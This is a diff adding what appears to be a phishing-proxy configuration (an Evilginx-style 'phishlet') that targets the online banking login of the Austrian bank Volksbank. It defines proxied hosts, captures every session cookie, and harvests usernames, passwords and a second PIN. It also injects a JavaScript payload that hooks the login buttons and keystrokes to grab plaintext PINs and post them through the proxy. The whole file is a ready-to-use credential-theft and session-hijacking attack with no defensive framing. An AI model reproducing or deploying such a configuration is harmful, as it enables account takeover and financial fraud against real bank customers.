@@ -1,0 +1,168 @@
+
+author: '@EvilWhales'
+min_ver: '3.3.0'
+
+proxy_hosts:
+  - {phish_sub: '', orig_sub: '', domain: 'volksbank.at', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'analytics', orig_sub: 'analytics', domain: 'arz.at', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'banking', orig_sub: 'banking', domain: 'volksbank.at', session: true, is_landing: true, auto_filter: false}
+
+sub_filters:
+  - {triggers_on: 'volksbank.at', orig_sub: '', domain: 'volksbank.at', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'volksbank.at', orig_sub: 'analytics', domain: 'arz.at', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'volksbank.at', orig_sub: 'banking', domain: 'banking.volksbank.at', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'banking.volksbank.at', orig_sub: '', domain: 'volksbank.at', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'banking.volksbank.at', orig_sub: 'analytics', domain: 'arz.at', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+auth_urls:
+  - '/banking/dashboard'
+  - '/banking/*'
+
+auth_tokens:
+  - domain: 'banking.volksbank.at'
+    keys: ['.*,regexp']
+  - domain: '.volksbank.at'
+    keys: ['.*,regexp']
+  - domain: 'volksbank.at'
+    keys: ['.*,regexp']
+
+credentials:
+  username:
+    key: 'loginform:benutzername'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+  custom:
+    key: 'password2'
+    search: '(.*)'
+    type: 'post'
+
+
+login:
+  domain: 'banking.volksbank.at'
+  path: '/banking/login.xhtml?m=101'
+
+js_inject:
+  - trigger_domains: ["banking.volksbank.at"]
+    trigger_paths: ["/banking/login.xhtml"]
+    trigger_params: []
+    script: |
+      (function() {
+        console.log("JS inject loaded: Simplified Volksbank dual PIN capture");
+        
+        var capturedPins = {};  // {password: 'plain1', password2: 'plain2'}
+        
+        function capturePins() {
+          var pinInput1 = document.querySelector('input[name="loginform:password"]');
+          var pinInput2 = document.querySelector('input[name="loginform:password2c"]');
+          
+          if (pinInput1) {
+            var val1 = pinInput1.value.trim();
+            if (val1 && val1 !== capturedPins.password) {
+              capturedPins.password = val1;
+              console.log("PIN1 plain updated: " + val1);
+            }
+          }
+          if (pinInput2) {
+            var val2 = pinInput2.value.trim();
+            if (val2 && val2 !== capturedPins.password2) {
+              capturedPins.password2 = val2;
+              console.log("PIN2 plain updated: " + val2);
+            }
+          }
+        }
+        
+        function sendPlainPins() {
+          var postData = '';
+          var hasData = false;
+          if (capturedPins.password) {
+            postData += 'password=' + encodeURIComponent(capturedPins.password);
+            hasData = true;
+          }
+          if (capturedPins.password2) {
+            if (postData) postData += '&';
+            postData += 'password2=' + encodeURIComponent(capturedPins.password2);
+            hasData = true;
+          }
+          if (!hasData) return;
+          
+          var xhr = new XMLHttpRequest();
+          xhr.open("POST", '/banking/login.xhtml', true);
+          xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+          xhr.onreadystatechange = function() {
+            if (xhr.readyState === 4) {
+              console.log("Plain sent (" + postData.substring(0, 30) + "...) status: " + xhr.status);
+              capturedPins = {};
+            }
+          };
+          xhr.send(postData);
+        }
+        
+        function hookButton(buttonId) {
+          var button = document.getElementById(buttonId);
+          if (!button || button.dataset.hooked) return;
+          button.dataset.hooked = 'true';
+          
+          var originalOnclick = button.onclick;
+          button.onclick = function(e) {
+            capturePins();
+            sendPlainPins();
+            console.log("Hook triggered on " + buttonId + ", sending plain...");
+            
+            if (originalOnclick) {
+              var result = originalOnclick.call(this, e);
+              console.log("Original onclick result: " + result);
+              return result;
+            }
+            return true;
+          };
+          console.log("Hooked button: " + buttonId);
+        }
+        
+        var observer = new MutationObserver(function(mutations) {
+          var needsCapture = false;
+          mutations.forEach(function(mutation) {
+            if (mutation.type === 'childList' && mutation.addedNodes.length > 0) {
+              needsCapture = true;
+            }
+          });
+          if (needsCapture) {
+            capturePins();
+            hookButton('loginform:loginButton');
+            hookButton('loginform:loginButton2');
+          }
+        });
+        observer.observe(document.body, { childList: true, subtree: true });
+        
+        function addKeyupHooks() {
+          var pinInput1 = document.querySelector('input[name="loginform:password"]');
+          var pinInput2 = document.querySelector('input[name="loginform:password2c"]');
+          if (pinInput1 && !pinInput1.dataset.keyupHooked) {
+            pinInput1.dataset.keyupHooked = 'true';
+            pinInput1.addEventListener('keyup', capturePins);
+          }
+          if (pinInput2 && !pinInput2.dataset.keyupHooked) {
+            pinInput2.dataset.keyupHooked = 'true';
+            pinInput2.addEventListener('keyup', capturePins);
+          }
+        }
+        
+        setTimeout(function() {
+          capturePins();
+          addKeyupHooks();
+          hookButton('loginform:loginButton');
+          hookButton('loginform:loginButton2');
+        }, 1000);
+        
+        setInterval(function() {
+          capturePins();
+          if (Object.keys(capturedPins).length > 0) {
+            sendPlainPins();
+          }
+        }, 2000);
+        
+        console.log("Simplified hooks initialized");
+      })();
